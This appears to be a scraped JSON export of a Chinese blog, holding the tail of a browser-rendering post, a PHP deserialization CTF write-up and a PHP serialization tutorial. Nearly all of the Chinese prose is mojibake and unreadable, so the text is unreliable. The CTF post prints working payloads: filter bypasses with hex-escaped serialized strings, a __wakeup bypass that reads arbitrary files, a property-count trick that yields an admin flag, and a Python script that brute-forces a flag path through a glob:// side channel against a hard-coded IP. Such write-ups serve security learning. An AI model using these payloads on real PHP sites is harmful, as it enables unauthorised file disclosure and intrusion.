å…³é”®æ¸²æŸ“è·¯å¾„çš„æœ€åä¸€æ­¥å°±æ˜¯Paintç»˜åˆ¶ï¼Œå°±æ˜¯è¦å°†æ‰€æœ‰çš„å¯è§†çš„å†…å®¹éƒ½ç»˜åˆ¶åˆ°å±å¹•ä¸Šå»ï¼ŒåŒ…æ‹¬æ–‡å­—ï¼Œé¢œè‰²ï¼Œé—´è·ï¼Œé˜´å½±ä»¥åŠå¯ä»¥æ›¿æ¢çš„å…ƒç´ ï¼Œä¾‹å¦‚æŒ‰é’®ï¼ˆæŒ‰ä¸‹å»çš„å›¾ç‰‡ï¼‰ä»¥åŠå›¾ç‰‡ã€‚ ä¸ºäº†ä¿è¯é¡µé¢èƒ½å¤Ÿæµç•…çš„æ»šåŠ¨ä»¥åŠåŠ¨ç”»æ•ˆæœï¼ŒPaintå°†å æ®ä¸»çº¿ç¨‹æ¥è¿›è¡Œç»˜åˆ¶ï¼Œä¸ºäº†ç¡®ä¿ç»˜åˆ¶çš„é€Ÿåº¦ï¼Œå±å¹•ä¸Šçš„ç»˜å›¾é€šå¸¸ä¼šè¢«åˆ†è§£ç§°æ•°å±‚æ¥è¿›è¡Œï¼Œé‚£ä¹ˆåŒæ—¶ä¹Ÿå°±éœ€è¦è¿›è¡Œåˆæˆã€‚ ç»˜åˆ¶ä¼šè®²layout tree ä¸­çš„å…ƒç´ åˆ†æˆå¤šå±‚ï¼Œå°†å†…å®¹æå‡åˆ°GPUå¯ä»¥æé«˜ç»˜åˆ¶å’Œå® å¹¸ç»˜åˆ¶çš„æ€§èƒ½ï¼šæœ‰ä¸€äº›ç‰¹å®šçš„å±æ€§å’Œå…ƒç´ å¯ä»¥ç»„æˆä¸€ä¸ªå±‚ï¼ˆä¾‹å¦‚\u0026lt;video\u0026gt;, \u0026lt;canvas\u0026gt;ï¼‰ï¼›CSSå±æ€§ä¸ºopacityã€3D transformã€ will-changeçš„å…ƒç´ ï¼Œä¹Ÿå¯ä»¥ç»„æˆå•ç‹¬çš„å±‚æ¥è¿›è¡Œç»˜åˆ¶ï¼Œä¸è¿‡è¿™ä¹Ÿæ„å‘³ç€éœ€è¦æ¶ˆè€—æ›´å¤šçš„å†…å­˜ï¼Œæ³¨æ„ä¸èƒ½è¿‡åº¦ä½¿ç”¨ Compositing åˆæˆ é‚£ä¹ˆåœ¨Paintçš„è¿‡ç¨‹ä¸­åˆ†å±‚è¿›è¡Œä¹‹åï¼Œå°±éœ€è¦å¯¹æ‰€æœ‰çš„å±‚è¿›è¡Œåˆæˆï¼Œç›¸äº’é‡å ï¼Œä¿è¯å®ƒä»¬ä»¥æ­£å¸¸çš„é¡ºåºç»˜åˆ¶åˆ°å±å¹•ä¸Šï¼Œæ˜¾ç¤ºæ­£å¸¸çš„å†…å®¹ã€‚  Figure 7: Critical rendering path\n  Interactivity äº¤äº’ ä¸»çº¿ç¨‹ç»˜åˆ¶é¡µé¢çš„ä»»åŠ¡å®Œæˆå¹¶ä¸ä»£è¡¨ä¸€åˆ‡éƒ½å‡†å¤‡å°±ç»ªï¼Œè¿˜éœ€è¦åŠ è½½JavaScriptè„šæœ¬ï¼ˆæ¯”å¦‚onloadå±æ€§å°±æ˜¯ç­‰å¾…ç»™å®šçš„èµ„æºåŠ è½½å®Œæˆæ—¶è§¦å‘ï¼‰ï¼Œé‚£ä¹ˆåœ¨åŠ è½½JSçš„è¿‡ç¨‹ä¸­ï¼Œè®°å¾—æˆ‘ä»¬çš„æµè§ˆå™¨å¤§éƒ¨åˆ†è¿˜æ˜¯ä¸€ä¸ªå•çº¿ç¨‹ï¼Œå› æ­¤å°±æ— æ³•è¿›è¡Œæ»šåŠ¨ã€è§¦æ‘¸æˆ–è€…å…¶ä»–çš„äº¤äº’ æˆ‘ä»¬ç”¨ Time to Interactive (TTI) æ¥è¡¡é‡ä»ç¬¬ä¸€ä¸ªè¯·æ±‚æ‰€è§¦å‘DNNSæŸ¥è¯¢å¼€å§‹åˆ°é¡µé¢å¯ä»¥æ­£å¸¸æ•™åŠ¡æ‰€ä½¿ç”¨çš„æ—¶é—´ï¼Œé¡µé¢éœ€è¦åœ¨50msï¼Œå¦‚æœæ­¤æ—¶ä¸»çº¿ç¨‹è¿˜åœ¨è§£æï¼Œç¼–è¯‘å’Œæ‰§è¡ŒJSå°±ä¼šå¯¼è‡´é¡µé¢ä¸ä¸èƒ½ç›¸åº”ç”¨æˆ·çš„äº¤äº’ï¼Œè¿™å°±æ˜¯éœ€è¦è°ƒæ•´çš„åœ°æ–¹ã€‚ Reference Populating the page: how browsers work æ¸²æŸ“é¡µé¢ï¼šæµè§ˆå™¨çš„å·¥ä½œåŸç† Critical Resources and the First 14 KB - A Review å…³äºé¦–å±htmlåº”é™åˆ¶åœ¨14kbå†…çš„æ¢ç©¶ è¯¦è§£TCPä¸­çš„æ‹¥å¡æ§åˆ¶ What is accessibility? Accessibility Inspector ","date":"2022-06-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/how_browsers_work/","title":"æµè§ˆå™¨æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ"},{"content":"PHP ååºåˆ—åŒ–å®ä¾‹ç»ƒä¹  å®ä¾‹1 æ¥æºï¼šphpååºåˆ—åŒ–åˆ©ç”¨â€”â€”POPé“¾æ„é€ å®ä¾‹ \u0026lt;?php // é¢˜ç›®ä¸­çš„ç¬¬ä¸€ä¸ªClass class MyDirectory { public $name; // æ„é€ å™¨ï¼Œæ–°çš„å¯¹è±¡å»ºç«‹æ—¶è¢«è°ƒç”¨  public function __construct($name) { $this-\u0026gt;name = $name; } // å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘  public function __toString(){ // ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶æ•°é‡  $num = count(scandir($this-\u0026gt;name)); if($num \u0026gt; 0){ return \u0026#34;count $numfiles\u0026#34;; } else { // Cé™åˆ¶ç‚¹  return \u0026#34;flag path is /flag_{{uuid}}\u0026#34;; } } } // é¢˜ç›®ä¸­çš„ç¬¬äºŒä¸ªClass class MyFile { public $name; public $user; public function __construct($name, $user) { $this-\u0026gt;name = $name; $this-\u0026gt;user = $user; } public function __toString(){ return file_get_contents($this-\u0026gt;name); } // Bé™åˆ¶ç‚¹  // ååºåˆ—åŒ–æ—¶è°ƒç”¨  public function __wakeup(){ if(stristr($this-\u0026gt;name, \u0026#34;flag\u0026#34;)!==False) $this-\u0026gt;name = \u0026#34;/etc/hostname\u0026#34;; else $this-\u0026gt;name = \u0026#34;/etc/passwd\u0026#34;; if(isset($_GET[\u0026#39;user\u0026#39;])) { $this-\u0026gt;user = $_GET[\u0026#39;user\u0026#39;]; } } public function __destruct() { // ä¼šè°ƒç”¨__toString  echo $this; } } //é¢˜ç›®ä¸­çš„é™åˆ¶ if(isset($_GET[\u0026#39;input\u0026#39;])){ $input = $_GET[\u0026#39;input\u0026#39;]; // Aé™åˆ¶ç‚¹  if(stristr($input, \u0026#39;user\u0026#39;)!==False){ die(\u0026#39;Hacker\u0026#39;); } else { unserialize($input); } }else { highlight_file(__FILE__); } è§‚å¯Ÿæºç æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„å‘ç°æœ€ç»ˆçš„ç›®æ ‡ï¼Œå°±æ˜¯è®© MyDirectory çš„å¯¹è±¡é€šè¿‡ __toString æ¥è¿”å›flagæ–‡ä»¶çš„è·¯å¾„ æºç å†…æˆ‘ä»¬æ ‡å‡ºäº†ä¸‰ä¸ªé™åˆ¶ç‚¹ï¼š  A, å¯¹GETè¾“å…¥æ£€æŸ¥æ˜¯å¦åŒ…å«\u0026rsquo;users\u0026rsquo;å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„sä¸ºSï¼Œè¿™æ ·å°±å¯ä»¥æ”¯æŒåˆ©ç”¨16è¿›åˆ¶ç¼–ç æ¥è¿›è¡Œç»•è¿‡ï¼Œ s:4:\u0026quot;user\u0026quot;; -\u0026gt; S:4:\u0026quot;use\\72\u0026quot;;  B, æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­å¯¹äº MyFile-\u0026gt;name ä¼šè¢« __wakeup ç»™æ›¿æ¢æ‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¿®æ”¹å±æ€§æ¥ç»•è¿‡ __wakeup çš„æ›¿æ¢ï¼ˆæ­¤æ–¹æ³•é€‚ç”¨äºPHP 7.0.10ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æµ…copyæ¥å¯¹å¯æ§å˜é‡ $this-\u0026gt;user æ¥è¿›è¡Œè¿‡æ»¤  C, æ— æ³•ç›´æ¥è·å–æ–‡ä»¶åï¼Œå¯ä»¥é…åˆ glob:// åè®®æ¥æµ‹ä¿¡é“å‡º flag çš„æ–‡ä»¶åå­—   å› æ­¤æˆ‘ä»¬æ„é€  payloadï¼š \u0026lt;?php class MyFile { public $name=\u0026#39;/etc/hosts\u0026#39;; public $user=\u0026#39;\u0026#39;; } $a = new MyFile(); // åˆ©ç”¨å¯æ§å‚æ•° $a-\u0026gt;useræ¥ç»•è¿‡ $this-\u0026gt;nameçš„è¿‡æ»¤ // \u0026amp;$a-\u0026gt;userè¡¨ç¤ºä¼ ä¸€ä¸ªå¼•ç”¨ï¼Œè€Œä¸æ˜¯å•çº¯çš„å€¼ï¼Œç»“æœå°±æ˜¯å¦‚æœ $a-\u0026gt;user å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆ $a-\u0026gt;name ä¹Ÿä¼šè·Ÿç€æ”¹å˜ // è¿™æ ·å°±å¯ä»¥é˜²æ­¢ $a-\u0026gt;name è¢«æ›¿æ¢ï¼ŒåŒæ—¶å› ä¸ºMyfileä¸­ä¼šæ ¹æ® $_GET[\u0026#39;user\u0026#39;] æ¥ç»™ $a-\u0026gt;user èµ‹å€¼ï¼Œå› æ­¤å¯ä»¥å®Œæˆå˜é‡æ§åˆ¶ $a-\u0026gt;name = \u0026amp;$a-\u0026gt;user; $b = serialize($a); // ç»•è¿‡ \u0026#39;user\u0026#39; è¿‡æ»¤ $b = str_replace(\u0026#34;user\u0026#34;,\u0026#34;use\\\\72\u0026#34;,$b); $b = str_replace(\u0026#34;;s:4:\u0026#34;,\u0026#34;;S:4:\u0026#34;,$b); var_dump($b); // å¾—åˆ°åºåˆ—åŒ–ç»“æœ: // O:6:\u0026#34;MyFile\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:0:\u0026#34;\u0026#34;;S:4:\u0026#34;use\\\\72\u0026#34;;R:2;}  // æ–‡ä»¶ä»»æ„è¯» payloadï¼š // input=O:6:\u0026#34;MyFile\u0026#34;:2: {s:4:\u0026#34;name\u0026#34;;s:0:\u0026#34;\u0026#34;;S:4:\u0026#34;us\\65r\u0026#34;;R:2;}\u0026amp;user=/proc/self/mounts Payloadä¸­å‡ºç°çš„ R:2; è¡¨ç¤ºçš„å˜é‡çš„ç±»å‹æ˜¯å¼•ç”¨ï¼ˆæ˜¾ç¤ºçš„å¼•ç”¨ï¼‰ è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯é€šè¿‡æ„é€ POPé“¾æ¥è°ƒç”¨æ•æ„Ÿå‡½æ•° file_get_contents æ¥è·å–ä»»æ„æ–‡ä»¶çš„å†…å®¹ï¼› __construct() ( -\u0026gt; unserialize()) -\u0026gt; __wakeup() -\u0026gt; __destruct() (-\u0026gt; echo()) -\u0026gt; __toString() (è°ƒç”¨ __destruct() çš„æ—¶å€™è°ƒç”¨äº†echo $this, è§¦å‘äº† __toString()) å¤§å®¶å¯ä»¥å•æ­¥è°ƒè¯•ä¸€ä¸‹ï¼Œå°±èƒ½æ›´å¥½çš„ç†è§£è¿™è¾¹çš„POPé“¾ä»¥åŠè¿™è¾¹ç”¨åˆ°çš„å¯¹è±¡å¼•ç”¨é—®é¢˜  Figure 1: å•æ­¥è°ƒè¯•POPé“¾\n  é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åªå‰©ä¸‹flagçš„æ–‡ä»¶è·¯å¾„ä¸çŸ¥é“äº†ï¼Œæ­¤æ—¶å°±éœ€è¦æƒ³åŠæ³•åˆ©ç”¨ MyDirectoryç±» æ¥ \u0026lt;?php class MyDirectory { public $name=\u0026#39;glob:///flag_\u0026#39;; } class MyFile { public $name=\u0026#39;/etc/hostname\u0026#39;; public $user=\u0026#39;\u0026#39;; } $a = new MyFile(); $a-\u0026gt;name = new MyDirectory(); $b = serialize($a); var_dump($b); print(urlencode($b)) // O:6:\u0026#34;MyFile\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;O:11:\u0026#34;MyDirectory\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:13:\u0026#34;glob:///flag_\u0026#34;;}s:4:\u0026#34;user\u0026#34;;s:0:\u0026#34;\u0026#34;;} æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨PHPä¼ªåè®®ï¼Œ glob:// æ¥åŒ¹é…æŸ¥æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œåˆ©ç”¨æµ‹ä¿¡é“æ”»å‡»ï¼Œå³å¦‚æœglobåŒ¹é…æˆåŠŸï¼Œåˆ™è¿”å›çš„æ˜¯ /etc/hostname å…¶ä¸­é¿å…åŒ…å«\u0026rsquo;root\u0026rsquo;å­—æ®µï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¿”å› /etc/passwd ç„¶åé€æ­¥æ‹¼æ¥flagçš„å­—ç¬¦ä¸²ï¼Œå°±å’Œæˆ‘ä»¬åœ¨sqlæ³¨å…¥ä¸­çš„ç›²æ³¨æ˜¯ä¸€ä¸ªé“ç† import requests url = \u0026#39;http://124.16.75.162:31102/\u0026#39; flag = \u0026#39;\u0026#39; # å‡è®¾flagæœ€å¤šæœ‰40ä¸ªå­—ç¬¦è¿™ä¹ˆé•¿ for _ in range(1,40): # åˆ©ç”¨åŒ¹é…Asciiå­—ç¬¦  for i in range(32,128): if i == 37 or i == 42 or i == 63: continue param = r\u0026#39;?input=O:6:\u0026#34;MyFile\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;O:11:\u0026#34;MyDirectory\u0026#34;:1: {s:4:\u0026#34;name\u0026#34;;s:\u0026#39;+str(14+_)+\u0026#39;:\u0026#34;glob:///flag_\u0026#39;+flag+chr(i)+\u0026#39;%2a\u0026#34;;}S:4:\u0026#34;us\\\\65r\u0026#34;;s :0:\u0026#34;\u0026#34;;}\u0026#39; res = requests.get(url+param) # æµ‹ä¿¡é“æ”»å‡»ï¼Œæ ¹æ®è¿”å›çš„æ–‡ä»¶å†…å®¹åˆ¤æ–­æ˜¯å¦åŒ¹é…ä¸Šäº†  if \u0026#39;root\u0026#39; in res.text: flag += chr(i) print(flag) # æœ€åå¾—åˆ°è·¯å¾„ # flag_fecd0d9b-2852-497d-b829-0c5bf11c5021 [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1 çŒ«çŒ«çœŸä¸é”™ï¼Œä½†æ˜¯ä¸èƒ½ç»™flagå•Š æ ¹æ®æ–‡å­—æç¤ºï¼Œç›´æ¥å…ˆç”¨dirsearchçˆ†ç ´ä¸€ä¸‹ç›®å½•çœ‹çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶ ./dirsearch.py -u http://63038eb9-d80a-4dba-ac04-c7cc6f1b1592.node4.buuoj.cn:81/ -e php  Figure 2: åˆ©ç”¨dirsearchæ‰¾åˆ°å¤‡ä»½æ–‡ä»¶\n  æ¥ç€æˆ‘ä»¬ä¸‹è½½è¯¥æ–‡ä»¶ è§£å‹ç¼©åå°±å‘ç°äº†ç½‘é¡µçš„æ‰€æœ‰å¤‡ä»½æ–‡ä»¶ index.php \u0026lt;?php include \u0026#39;class.php\u0026#39;; $select = $_GET[\u0026#39;select\u0026#39;]; $res=unserialize(@$select); ?\u0026gt;class.php \u0026lt;?php include \u0026#39;flag.php\u0026#39;; error_reporting(0); class Name{ private $username = \u0026#39;nonono\u0026#39;; private $password = \u0026#39;yesyes\u0026#39;; public function __construct($username,$password){ $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } function __wakeup(){ $this-\u0026gt;username = \u0026#39;guest\u0026#39;; } function __destruct(){ if ($this-\u0026gt;password != 100) { echo \u0026#34;\u0026lt;/br\u0026gt;NO!!!hacker!!!\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You name is: \u0026#34;; echo $this-\u0026gt;username;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You password is: \u0026#34;; echo $this-\u0026gt;password;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; die(); } if ($this-\u0026gt;username === \u0026#39;admin\u0026#39;) { global $flag; echo $flag; }else{ echo \u0026#34;\u0026lt;/br\u0026gt;hello my friend~~\u0026lt;/br\u0026gt;sorry i can\u0026#39;t give you the flag!\u0026#34;; die(); } } } ?\u0026gt;çœ‹åˆ°è¿™äº›é­”æœ¯æ–¹æ³•æˆ‘ä»¬è‡ªç„¶å°±æƒ³åˆ°è¦æ„å»º POPé“¾æ¥è¿›è¡Œååºåˆ—åŒ–è°ƒç”¨ åªè¦__destruct() çš„æ—¶å€™æ»¡è¶³ $this-\u0026gt;username = \u0026lsquo;admin\u0026rsquo;, $this-\u0026gt;password = 100 å³å¯è¾“å‡ºflagï¼Œä½†æ˜¯ __wakeup() å´ä¼šåœ¨ä¸€å¼€å§‹å°±ä¿®æ”¹ $this-\u0026gt;username çš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•ç»•è¿‡ __wakeup() åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡ç”³æ˜çš„å±æ€§ä¸ªæ•°å¤§äºå®é™…ä¸ªæ•°æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è·³è¿‡ __wakeup() çš„æ‰§è¡Œï¼Œæˆ‘ä»¬æ„é€ payload \u0026lt;?php class Name{ private $username=\u0026#39;admin\u0026#39;; private $password=100; } $p = new Name; $s = serialize($p); var_dump($s); print(urlencode($s)); ?\u0026gt; Figure 3: Payload serialisation payload\n  æ¥ç€æˆ‘ä»¬ä¿®æ”¹ç”³æ˜çš„å±æ€§ä¸ªæ•° O%3A4%3A%22Name%2 3 %3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D http://63038eb9-d80a-4dba-ac04-c7cc6f1b1592.node4.buuoj.cn:81/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D  Figure 4: å¾—åˆ°Flagï¼\n  å‚è€ƒï¼š[[https://segmentfault.com/a/1190000022534926][CTF-Web-[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP ","date":"2022-06-19T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_unserialize_examples/","title":"PHP ååºåˆ—åŒ–å®ä¾‹ç»ƒä¹ "},{"content":"PHP åºåˆ—åŒ–ä¸ååºåˆ—åŒ– PHPç¨‹åºä¸ºäº†ä¿æŠ¤å’Œè½¬å‚¨å¯¹è±¡ objectï¼Œæä¾›äº†åºåˆ—åŒ– serializeçš„æ–¹æ³•ï¼Œå…¶å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä½†ä»…ä¿ç•™å¯¹è±¡é‡Œçš„æˆå‘˜å˜é‡ï¼Œä¸ä¿ç•™å‡½æ•°æ–¹æ³• PHPåºåˆ—åŒ–çš„å‡½æ•°ä¸º serialize, ååºåˆ—åŒ–çš„å‡½æ•°ä¸º unserialize Serialize åºåˆ—åŒ– ä»€ä¹ˆåºåˆ—åŒ–å‘¢ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥çœ‹ä¸€ä¸‹ \u0026lt;?php class Test{ public $a=\u0026#34;ThisA\u0026#34;; protected $b=\u0026#34;ThisB\u0026#34;; private $c=\u0026#34;ThisC\u0026#34;; public function test1(){ return \u0026#39;this is test1\u0026#39;; } } $test = new Test(); var_dump(serialize($test)); ?\u0026gt;åºåˆ—åŒ–åå°±ä¼šäº§ç”Ÿå¦‚ä¸‹çš„å­—èŠ‚æµï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†ä¿å­˜PHPä¸­æ‰€æœ‰çš„ç±»ï¼Œæ–¹æ³•ï¼Œå˜é‡çš„ç±»å‹ä»¥åŠä»–ä»¬æ‰€ç»„æˆçš„ç»“æ„  Figure 1: serialize()\n  serialize(mixed $value): string åºåˆ—åŒ–åçš„å­—èŠ‚æµè¯¦è§£ æ¥ç€æˆ‘ä»¬å…·ä½“æ¥åˆ†æä¸€ä¸‹è¿™ä¸€ä¸²å­—èŠ‚æµä»£è¡¨ä»€ä¹ˆå†…å®¹  O è¡¨ç¤º object å¯¹è±¡ï¼Œ :4 è¡¨ç¤ºå¯¹è±¡åçš„é•¿åº¦æœ‰4ä¸ªå­—ç¬¦  :\u0026quot;Test\u0026quot; è¡¨ç¤ºå¯¹è±¡çš„åç§°ï¼Œ :3 è¡¨ç¤ºè¯¥å¯¹è±¡ä¸­æœ‰3ä¸ªæˆå‘˜å˜é‡  é€šè¿‡æ‹¬å·æ¥è¡¨ç¤ºç»“æœï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥æ˜¯å¯¹è±¡é‡Œé¢çš„æˆå‘˜å˜é‡ï¼Œå› ä¸ºå˜é‡æ¶‰åŠåˆ°å˜é‡åä»¥åŠå˜é‡çš„å€¼ï¼Œå› æ­¤å®ƒä»¬éƒ½ä¼šè¢«åºåˆ—åŒ–ï¼Œå¹¶ç”¨ ; æ¥è¿›è¡Œåˆ†å‰²ï¼š  s:1:\u0026quot;a\u0026quot; æ˜¯åºåˆ—åŒ–å˜é‡åçš„ç»“æœ  s è¡¨ç¤ºæ˜¯å­—ç¬¦ä¸²ï¼Œ 1 è¡¨ç¤ºåªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œ :\u0026quot;a\u0026quot; è¡¨ç¤ºå€¼ä¸º a å…¶ä»–åŒç†å¯å¾—       æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°åé¢çš„å˜é‡åå’Œå˜é‡å€¼ä¹Ÿæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œä½†æ˜¯å˜é‡åçš„è¡¨ç¤ºæ ¹æ® Access Modifiers, è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ çš„ä¸åŒè€Œæœ‰ä¸åŒçš„è¡¨ç¤ºæ–¹æ³• public(å…¬æœ‰) protected(å—ä¿æŠ¤) // %00*%00å±æ€§å private(ç§æœ‰çš„) // %00ç±»å%00å±æ€§å protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ %00*%00å±æ€§å privateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ %00ç±»å%00å±æ€§å ï¼ˆ%00ä¸ºç©ºç™½ç¬¦ï¼Œç©ºå­—ç¬¦ä¹Ÿæœ‰é•¿åº¦ï¼Œä¸€ä¸ªç©ºå­—ç¬¦é•¿åº¦ä¸º 1ï¼‰ å°±å¦‚åŒæˆ‘ä»¬è¿™é‡Œçš„ç»“æœï¼š s:4:\u0026#34;*b\u0026#34;; = s:4:\u0026#34;%00*%00b\u0026#34;; s:7:\u0026#34;Testc\u0026#34;; = s:7:\u0026#34;%00Test%00c\u0026#34;; Unserialize ååºåˆ—åŒ– \u0026lt;?php class Test { public $a = \u0026#39;This A\u0026#39;; protected $b = \u0026#39;This B\u0026#39;; private $c = \u0026#39;This C\u0026#39;; public function test() { return \u0026#39;this is test\u0026#39;; } } $test = new Test(); $sTest = serialize($test); $usTest = unserialize($sTest); print_r($usTest); ?\u0026gt;ç»“æœå¦‚ä¸‹ï¼š  Figure 2: unserialize ååºåˆ—åŒ–\n  æˆ‘ä»¬çœ‹ååºåˆ—åŒ–åçš„å†…å®¹å°±å¯ä»¥æ›´å¥½çš„ç†è§£ä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ– Magic Methods é­”æœ¯æ–¹æ³• å¾ˆå¤šæ•™ç¨‹éƒ½æåˆ°äº†é­”æœ¯æ–¹æ³•çš„æ¦‚å¿µï¼Œä½†æ²¡æœ‰è¿›è¡Œå®šä¹‰å’Œè§£é‡Šï¼Œå®˜ç½‘çš„å®šä¹‰æ€»ç»“å¦‚ä¸‹ï¼š é­”æœ¯æ–¹æ³•æ˜¯å®šä¹‰åœ¨ç±»å†…éƒ¨çš„ä»¥ __ å¼€å¤´çš„æ–¹æ³•ï¼Œé€šè¿‡å¯¹é­”æœ¯æ–¹æ³•çš„å®ç°å¯ä»¥é‡å†™PHPå¯¹äºå¯¹è±¡çš„é»˜è®¤æ“ä½œï¼Œä¾‹å¦‚åºåˆ—åŒ–ç­‰ __construct() #ç±»ä¼¼C++æ„é€ å‡½æ•°,å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨,ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ __destruct() #å½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰åç»­è¢«å¼•ç”¨æ—¶ï¼Œè¢«è°ƒç”¨ï¼ˆæ³¨æ„è¯´é”€æ¯å¹¶ä¸å‡†ç¡®ï¼‰ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„ __toString() #å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è¢«è°ƒç”¨ __invoke() #å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ __sleep() #serialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ __wakeup() #unserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ __call() #å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚ __get() #åœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ __set() #ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ï¼ˆæ ¹æ®Access modifilersæ¥åˆ¤æ–­,e.g., protected, privateï¼‰ __isset() #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ æˆ‘ä»¬æ¥ä¸¾ä¸ªä¾‹å­çœ‹çœ‹è¿™äº›é­”æœ¯æ–¹æ³•å¦‚ä½•å¯¹ååºåˆ—åŒ–é€ æˆå½±å“ ç»§ç»­æ²¿ç”¨æˆ‘ä»¬ä¸Šé¢çš„ä¾‹å­ \u0026lt;?php class Test { public $a = \u0026#39;This A\u0026#39;; protected $b = \u0026#39;This B\u0026#39;; private $c = \u0026#39;This C\u0026#39;; public function test() { return \u0026#39;this is test\u0026#39;; } public function __wakeup() { $this-\u0026gt;c=\u0026#39;This is not c\u0026#39;; } } $test = new Test(); $sTest = serialize($test); $usTest = unserialize($sTest); var_dump($usTest); æˆ‘ä»¬é€šè¿‡å®ç°ä¸€ä¸ª __wakeup æ–¹æ³•ï¼Œå…¶ä¼šåœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è¢«è°ƒç”¨ï¼ŒåŒæ—¶ä¿®æ”¹ $c çš„å€¼  Figure 3: __wakeup()\n  å»ºè®®å¤§å®¶å¯ä»¥å•æ­¥è°ƒè¯•ä¸€ä¸‹ä¸‹é¢çš„ä»£ç ï¼Œå¯ä»¥æœ‰åŠ©äºç†è§£æ¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•çš„å…·ä½“ä½œç”¨ \u0026lt;?php # è®¾ç½®ä¸€ä¸ªç±»A class A{ private $name = \u0026#34;V0W\u0026#34;; function __construct() { echo \u0026#34;__construct() call\\n\u0026#34;; } function __destruct() { echo \u0026#34;\\n__destruct() call\\n\u0026#34;; } function __toString() { return \u0026#34;__toString() call\\n\u0026#34;; } function __sleep() { echo \u0026#34;__sleep() call\\n\u0026#34;; return array(\u0026#34;name\u0026#34;); } function __wakeup() { echo \u0026#34;__wakeup() call\\n\u0026#34;; } function __get($a) { echo \u0026#34;__get() call\\n\u0026#34;; return $this-\u0026gt;name; } function __set($property, $value) { echo \u0026#34;\\n__set() call\\n\u0026#34;; $this-\u0026gt;$property = $value; } function __invoke() { echo \u0026#34;__invoke() call\\n\u0026#34;; } } //è°ƒç”¨ __construct() $a = new A(); //è°ƒç”¨ __toSting() echo $a; //è°ƒç”¨ __sleep() $b = serialize($a); echo $b; //è°ƒç”¨ __wakeup() $c = unserialize($b); echo $c; 